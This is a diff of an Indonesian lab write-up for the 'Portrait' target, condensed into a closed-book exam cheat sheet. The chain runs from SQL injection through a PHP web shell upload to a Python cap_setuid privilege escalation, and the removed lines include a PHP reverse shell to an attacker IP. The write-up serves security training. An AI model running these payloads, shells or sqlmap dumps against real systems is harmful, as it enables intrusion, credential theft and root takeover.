@@ -1,123 +1,88 @@
-# Write-Up Privilege Escalation pada Portrait Server
+# Write-Up Lab Portrait — Versi Closed Book
 
-> **Versi Ringkas untuk Ujian Closed Book**
->
-> **Ruang lingkup:** materi ini hanya untuk lingkungan laboratorium yang telah memperoleh izin pengujian.
+> **Ruang lingkup:** hanya untuk laboratorium atau sistem yang telah memberikan izin pengujian.
 
----
+## 1. Gambaran Singkat
 
-## 📋 Ringkasan Satu Paragraf
+| Komponen | Nilai |
+|---|---|
+| Target | `192.168.56.118:8080` |
+| Aplikasi | Portrait Studio |
+| Celah awal | SQL Injection pada login |
+| Foothold | Upload web shell sebagai `www-data` |
+| Privilege escalation | Python memiliki `cap_setuid=ep` |
+| Akses akhir | `root` |
 
-Target web server `192.168.56.118:8080` memiliki kerentanan **SQL Injection** pada halaman login yang memungkinkan ekstraksi kredensial administrator. Setelah login, fitur upload avatar dapat dilewati untuk mengunggah web shell PHP. Web shell kemudian digunakan untuk enumerasi sistem dan menemukan bahwa Python memiliki capability `cap_setuid=ep`, yang memungkinkan privilege escalation dari user `www-data` menjadi `root`.
-
----
-
-## 🎯 Lima Fase Serangan: R-E-U-P-R
-
-| Fase | Nama | Aksi Utama | Output |
-|---:|---|---|---|
-| **1** | **R**econnaissance | Nmap dan Dirsearch | Menemukan port `8080`, `/administrator`, dan `/uploads` |
-| **2** | **E**xploit SQLi | SQL Injection pada login | Mendapatkan kredensial administrator |
-| **3** | **U**pload Bypass | Mengunggah web shell PHP | Command execution sebagai `www-data` |
-| **4** | **P**ost-Enumeration | Menjalankan `getcap -r /` | Menemukan `python3.13 cap_setuid=ep` |
-| **5** | **R**oot | Menjalankan payload Python | Privilege escalation menjadi `root` |
-
-> **Mnemonic:** **R-E-U-P-R** = **R**econ, **E**xploit SQL, **U**pload, **P**ost-Enumeration, **R**oot.
-
----
-
-# 🔍 Fase 1 — Reconnaissance
-
-## Step 1.1 — Nmap Scan
-
-```bash
-nmap -Pn -sC -sV 192.168.56.118
-```
-
-Hasil yang perlu diingat:
+Rantai serangan:
 
 ```text
-Port 8080 terbuka
-Service HTTP menggunakan Apache
+Recon
+→ SQL Injection
+→ credential admin
+→ upload PHP
+→ RCE sebagai www-data
+→ getcap
+→ Python cap_setuid
+→ root
 ```
 
-## Step 1.2 — Directory Enumeration
+## 2. Mnemonic: R-S-U-C-R
+
+```text
+R = Recon
+S = SQL Injection
+U = Upload web shell
+C = Capability
+R = Root
+```
+
+---
+
+# Fase 1 — Recon
+
+## 3. Scan Service dan Direktori
 
 ```bash
+nmap -Pn -sC -sV -p8080 192.168.56.118
+
 dirsearch \
   -u http://192.168.56.118:8080 \
   -e php
 ```
 
-Hasil penting:
+Temuan yang perlu diingat:
 
 ```text
-/administrator  → halaman login
-/uploads        → direktori upload file
-/profile        → halaman profil yang membutuhkan login
-```
-
-## Step 1.3 — Memeriksa Halaman Login
-
-```text
-http://192.168.56.118:8080/administrator
-```
-
-Form login memiliki parameter:
-
-```text
-username
-password
+/administrator  → login admin
+/profile        → upload avatar
+/uploads        → lokasi file upload
 ```
 
 ---
 
-# 💉 Fase 2 — SQL Injection
+# Fase 2 — SQL Injection
 
-## Step 2.1 — Login Bypass Manual
+## 4. Uji Login Bypass
 
-Payload utama:
+Payload:
 
 ```sql
 ' OR '1'='1
 ```
 
-Contoh request:
+Gunakan pada field login untuk memeriksa apakah autentikasi dapat dilewati.
 
-```http
-POST /administrator HTTP/1.1
-Host: 192.168.56.118:8080
-Content-Type: application/x-www-form-urlencoded
-
-username=' OR '1'='1&password=' OR '1'='1
-```
-
-### Mengapa Berhasil?
-
-Ekspresi berikut selalu bernilai benar:
-
-```sql
-'1'='1'
-```
-
-Secara sederhana, query autentikasi dapat berubah menjadi kondisi yang selalu benar:
-
-```sql
-SELECT *
-FROM users
-WHERE TRUE
-  AND TRUE;
-```
-
-Hasil:
+Alasan payload bekerja:
 
 ```text
-Bypass autentikasi → masuk sebagai administrator
+'1'='1' selalu bernilai TRUE
 ```
 
-## Step 2.2 — Ekstraksi Kredensial dengan SQLMap
+## 5. Dump Credential dengan SQLMap
 
-### Menemukan Database Aktif
+Gunakan pola yang sama: URL, data POST, parameter rentan, lalu opsi enumerasi.
+
+Cari database:
 
 ```bash
 sqlmap \
@@ -134,7 +99,7 @@ Hasil:
 portrait
 ```
 
-### Menemukan Tabel
+Cari tabel:
 
 ```bash
 sqlmap \
@@ -152,7 +117,7 @@ Hasil penting:
 users
 ```
 
-### Mengekstrak Data User
+Dump tabel:
 
 ```bash
 sqlmap \
@@ -165,508 +130,206 @@ sqlmap \
   --dump
 ```
 
-Hasil:
-
-```text
-username: admin
-password: AdminPortr417126
-```
-
-### Mnemonic SQLMap
-
-```text
-D-T-D = Database, Tables, Dump
-```
-
-| Tahap | Opsi | Fungsi |
-|---|---|---|
-| Database | `--current-db` | Menemukan database aktif |
-| Tables | `--tables` | Menemukan tabel |
-| Dump | `--dump` | Mengambil isi tabel |
-
----
-
-# 📤 Fase 3 — File Upload Bypass
-
-## Step 3.1 — Login sebagai Administrator
-
-Buka:
-
-```text
-http://192.168.56.118:8080/administrator
-```
-
-Gunakan:
+Credential lab:
 
 ```text
 Username : admin
 Password : AdminPortr417126
 ```
 
-Setelah login, akses:
+Mnemonic SQLMap:
+
+```text
+D-T-D
+Database → Tables → Dump
+```
+
+---
+
+# Fase 3 — Upload Web Shell
+
+## 6. Login dan Buka Profil
+
+Login:
+
+```text
+URL      : http://192.168.56.118:8080/administrator
+Username : admin
+Password : AdminPortr417126
+```
+
+Buka:
 
 ```text
 http://192.168.56.118:8080/profile
 ```
 
-Pada halaman tersebut tersedia fitur upload avatar.
-
-## Step 3.2 — Membuat Web Shell
-
-Nama file:
-
-```text
-cakgup.php
-```
-
-Isi:
-
-```php
-<?php
-system($_GET['cmd']);
-?>
-```
-
-Versi satu baris:
-
-```php
-<?php system($_GET['cmd']); ?>
-```
-
-## Step 3.3 — Mengunggah Payload
+## 7. Membuat Web Shell
 
 ```bash
-curl -X POST \
-  http://192.168.56.118:8080/profile \
-  -F "avatar=@cakgup.php;filename=cakgup.php;type=image/jpeg" \
-  -b "PHPSESSID=<SESSION_COOKIE>"
+cat > cakgup.php <<'EOF'
+<?php system($_GET['cmd']); ?>
+EOF
 ```
 
-Ganti `<SESSION_COOKIE>` dengan session ID setelah login.
+Upload melalui fitur avatar.
 
-Apabila file `.php` ditolak, gunakan double extension:
+Apabila aplikasi memeriksa MIME type, ubah MIME menjadi:
+
+```text
+image/jpeg
+```
+
+Apabila ekstensi `.php` ditolak, uji nama:
 
 ```text
 cakgup.php.jpg
 ```
 
-Langkah manual:
+> Jalur utama lab adalah memastikan file tetap diproses sebagai PHP setelah upload. Gunakan Burp Suite untuk mengubah nama file atau `Content-Type` bila diperlukan.
 
-1. Pilih file `cakgup.php`.
-2. Ubah nama menjadi `cakgup.php.jpg` apabila diperlukan.
-3. Submit file.
-4. Periksa hasil upload di direktori `/uploads`.
+## 8. Memvalidasi RCE
 
-## Step 3.4 — Mengakses Web Shell
+Coba lokasi berikut sesuai nama file yang berhasil diunggah:
 
 ```text
 http://192.168.56.118:8080/uploads/cakgup.php?cmd=id
 ```
 
-Atau:
+Versi curl:
 
 ```bash
+SHELL_URL="http://192.168.56.118:8080/uploads/cakgup.php"
+
 curl -sG \
   --data-urlencode "cmd=id" \
-  http://192.168.56.118:8080/uploads/cakgup.php
+  "$SHELL_URL"
 ```
 
-Hasil:
+Indikator:
 
 ```text
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data)
 ```
 
-Kesimpulan:
-
-```text
-Command execution berhasil sebagai user www-data.
-```
+Foothold berhasil sebagai `www-data`.
 
 ---
 
-# 🔎 Fase 4 — System Enumeration
+# Fase 4 — Menemukan Capability Berbahaya
 
-## Step 4.1 — Perintah Dasar
-
-Definisikan URL web shell:
-
-```bash
-BASE_URL="http://192.168.56.118:8080/uploads/cakgup.php"
-```
-
-### Memeriksa User
-
-```bash
-curl -sG \
-  --data-urlencode "cmd=id" \
-  "$BASE_URL"
-```
-
-Hasil:
-
-```text
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
-
-### Memeriksa Kernel
-
-```bash
-curl -sG \
-  --data-urlencode "cmd=uname -a" \
-  "$BASE_URL"
-```
-
-Hasil penting:
-
-```text
-Linux 5.15.0-178-generic
-```
-
-### Memeriksa Versi Sistem Operasi
-
-```bash
-curl -sG \
-  --data-urlencode "cmd=cat /etc/os-release" \
-  "$BASE_URL"
-```
-
-Hasil penting:
-
-```text
-Ubuntu 22.04.5 LTS
-```
-
-## Step 4.2 — Memeriksa SUID Binary
+## 9. Enumerasi Singkat
 
 ```bash
 curl -sG \
   --data-urlencode \
-  "cmd=find / -perm -4000 -type f 2>/dev/null" \
-  "$BASE_URL"
+  "cmd=id; uname -a; cat /etc/os-release" \
+  "$SHELL_URL"
 ```
 
-Contoh hasil:
-
-```text
-/usr/bin/passwd
-/usr/bin/su
-/usr/bin/mount
-/usr/bin/umount
-```
-
-Pada jalur eksploitasi ini, fokus utama bukan SUID binary, tetapi Linux capability.
-
-## Step 4.3 — Memeriksa Linux Capabilities
+Jangan langsung memakai kernel exploit. Periksa misconfiguration sederhana terlebih dahulu:
 
 ```bash
 curl -sG \
   --data-urlencode \
   "cmd=getcap -r / 2>/dev/null" \
-  "$BASE_URL"
+  "$SHELL_URL"
 ```
 
-Hasil kritis:
+Temuan kritis:
 
 ```text
 /usr/bin/python3.13 cap_setuid=ep
 ```
 
-### Arti Temuan
-
-Capability:
+Arti temuan:
 
 ```text
-cap_setuid=ep
+Python diizinkan mengubah UID proses.
+Python dapat menjalankan os.setuid(0).
+UID 0 adalah root.
 ```
 
-memungkinkan binary Python mengubah UID proses. Karena Python dapat memanggil `os.setuid(0)`, capability tersebut dapat digunakan untuk menjalankan proses dengan UID `0`.
+Rumus hafalan:
+
+```text
+Python + cap_setuid + os.setuid(0) = root
+```
 
 ---
 
-# 👑 Fase 5 — Privilege Escalation ke Root
+# Fase 5 — Root
 
-## Step 5.1 — Menjalankan Payload
-
-Gunakan binary yang memiliki capability secara eksplisit:
-
-```bash
-/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
-```
-
-Untuk pembuktian melalui web shell non-interaktif:
+## 10. Bukti Root Melalui Web Shell
 
 ```bash
 curl -sG \
   --data-urlencode \
   "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"id; whoami\")'" \
-  http://192.168.56.118:8080/uploads/cakgup.php
+  "$SHELL_URL"
 ```
 
-Payload inti yang perlu diingat:
-
-```bash
-/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
-```
-
-> Pada web shell non-interaktif, gunakan `os.system("id; whoami")` untuk pembuktian singkat. Untuk memperoleh shell interaktif, gunakan reverse shell terlebih dahulu.
-
-## Step 5.2 — Verifikasi Root
-
-```bash
-id
-```
-
-Hasil yang diharapkan:
-
-```text
-uid=0(root) gid=33(www-data) groups=33(www-data)
-```
-
-Kemudian:
-
-```bash
-whoami
-```
-
-Hasil:
-
-```text
-root
-```
-
-Privilege escalation berhasil.
-
----
-
-# 🔄 Opsi Alternatif — Reverse Shell
-
-## Step 1 — Menjalankan Listener di Kali Linux
-
-```bash
-nc -lvnp 1234
-```
-
-## Step 2 — Membuat Reverse Shell PHP
-
-Nama file:
-
-```text
-shell.php
-```
-
-Isi:
-
-```php
-<?php
-$sock = fsockopen("192.168.56.5", 1234);
-
-proc_open(
-    "/bin/sh -i",
-    array(
-        0 => $sock,
-        1 => $sock,
-        2 => $sock
-    ),
-    $pipes
-);
-?>
-```
-
-Sesuaikan IP `192.168.56.5` dengan alamat IP Kali Linux.
-
-## Step 3 — Mengakses File
-
-```text
-http://192.168.56.118:8080/uploads/shell.php
-```
-
-## Step 4 — Eskalasi dari Reverse Shell
-
-```bash
-/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
-```
-
-Verifikasi:
-
-```bash
-id
-whoami
-```
-
-Hasil yang diharapkan:
+Indikator:
 
 ```text
 uid=0(root)
 root
 ```
 
----
-
-# 📝 Cheat Sheet Hafalan
-
-## Lima Perintah Wajib
-
-| No. | Perintah | Fungsi |
-|---:|---|---|
-| 1 | `nmap -Pn -sC -sV 192.168.56.118` | Memindai port dan service |
-| 2 | `dirsearch -u http://192.168.56.118:8080 -e php` | Menemukan direktori dan endpoint |
-| 3 | `sqlmap -u URL --data="..." -p username --batch -D portrait -T users --dump` | Mengekstrak data database |
-| 4 | `getcap -r / 2>/dev/null` | Memeriksa Linux capability |
-| 5 | `/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'` | Eskalasi ke root |
-
-## Tiga Kerentanan Kunci
-
-| No. | Kerentanan | Lokasi | Dampak |
-|---:|---|---|---|
-| 1 | SQL Injection | `/administrator` | Bypass login dan ekstraksi kredensial |
-| 2 | Unrestricted File Upload | `/profile` | Upload dan eksekusi web shell |
-| 3 | Python `cap_setuid` | `/usr/bin/python3.13` | Privilege escalation menjadi root |
-
-## Hasil Penting yang Harus Diingat
-
-```text
-Target      : 192.168.56.118:8080
-Database    : portrait
-Tabel       : users
-Kredensial  : admin / AdminPortr417126
-User awal   : www-data (uid=33)
-Capability  : /usr/bin/python3.13 cap_setuid=ep
-User akhir  : root (uid=0)
-```
-
----
-
-# 🧠 Tips Menghafal
-
-## 1. Metode R-E-U-P-R
-
-```text
-R = Run Scan
-E = Exploit SQL
-U = Upload Shell
-P = Python Capability
-R = Root
-```
-
-## 2. Tiga Angka Penting
-
-```text
-Port HTTP    : 8080
-UID www-data : 33
-UID root     : 0
-```
-
-## 3. Tiga Path atau File Penting
-
-```text
-/administrator  → halaman login
-/uploads/       → direktori upload
-cakgup.php      → web shell
-```
-
-## 4. Dua Perintah Utama
-
-Mencari capability:
-
-```bash
-getcap -r / 2>/dev/null
-```
-
-Privilege escalation:
+Payload inti yang wajib diingat:
 
 ```bash
 /usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
 ```
 
-## 5. Mnemonic SQLMap
-
-```text
-D-T-D = Database, Tables, Dump
-```
-
-```text
---current-db → mencari database
---tables     → mencari tabel
---dump       → mengambil data
-```
+Pada web shell non-interaktif, gunakan `os.system("id; whoami")` sebagai bukti. Pada shell interaktif, gunakan `os.execl()` untuk membuka shell.
 
 ---
 
-# ⚡ Alur Singkat 30 Detik
+# 11. Cleanup
 
-```text
-1. Scan:
-   nmap → port 8080
-
-2. Enumerasi:
-   dirsearch → /administrator
-
-3. Bypass:
-   ' OR '1'='1 → login
-
-4. SQLMap:
-   D-T-D → admin / AdminPortr417126
-
-5. Upload:
-   cakgup.php → /uploads/
-
-6. Verifikasi:
-   cakgup.php?cmd=id → www-data
-
-7. Enumerasi:
-   getcap -r / → python3.13 cap_setuid=ep
-
-8. Root:
-   python3.13 + os.setuid(0)
-
-9. Bukti:
-   id → uid=0(root)
-```
+Hapus web shell melalui fitur profil/upload aplikasi. Apabila penghapusan harus dilakukan dari server, pastikan document root telah diverifikasi terlebih dahulu dan hapus hanya file yang dibuat selama pengujian.
 
 ---
 
-# ✅ Checklist Ujian
+# 12. Cheat Sheet 60 Detik
 
-- [ ] Nmap menemukan port `8080`.
-- [ ] Dirsearch menemukan `/administrator`.
-- [ ] SQL Injection berhasil melewati login.
-- [ ] SQLMap mengekstrak kredensial administrator.
-- [ ] File `cakgup.php` berhasil diunggah.
-- [ ] Web shell berjalan sebagai `www-data`.
-- [ ] `getcap` menemukan `/usr/bin/python3.13 cap_setuid=ep`.
-- [ ] Payload Python memberikan privilege root.
-- [ ] Perintah `id` menunjukkan `uid=0(root)`.
+```bash
+# 1. Recon
+nmap -Pn -sC -sV -p8080 192.168.56.118
+dirsearch -u http://192.168.56.118:8080 -e php
 
----
+# 2. SQLMap: D-T-D
+sqlmap -u http://192.168.56.118:8080/administrator \
+--data='username=admin&password=test' -p username --batch --current-db
 
-# 🎯 Kesimpulan
+sqlmap -u http://192.168.56.118:8080/administrator \
+--data='username=admin&password=test' -p username --batch \
+-D portrait --tables
 
-Attack chain pada Portrait Server dapat diingat menggunakan mnemonic:
+sqlmap -u http://192.168.56.118:8080/administrator \
+--data='username=admin&password=test' -p username --batch \
+-D portrait -T users --dump
 
-```text
-R-E-U-P-R
-Reconnaissance
-→ Exploit SQL Injection
-→ Upload Web Shell
-→ Post-Enumeration
-→ Root
+# 3. Upload PHP
+echo '<?php system($_GET["cmd"]); ?>' > cakgup.php
+
+# 4. RCE
+SHELL_URL="http://192.168.56.118:8080/uploads/cakgup.php"
+curl -sG --data-urlencode "cmd=id" "$SHELL_URL"
+
+# 5. Capability
+curl -sG --data-urlencode "cmd=getcap -r / 2>/dev/null" "$SHELL_URL"
+
+# 6. Root
+curl -sG --data-urlencode \
+"cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"id; whoami\")'" \
+"$SHELL_URL"
 ```
 
-Tiga kerentanan utama yang membentuk attack chain adalah:
+## Kalimat Hafalan
 
 ```text
-SQL Injection
-→ Unrestricted File Upload
-→ Python cap_setuid Misconfiguration
+Cari admin, SQLi login, dump user, upload PHP,
+cek getcap, Python setuid nol, lalu root.
 ```
-
-Hasil akhir:
-
-```text
-www-data (uid=33)
-→ /usr/bin/python3.13 cap_setuid=ep
-→ root (uid=0)
-```
-
-> **Tetap tenang saat ujian dan ingat: R-E-U-P-R.**
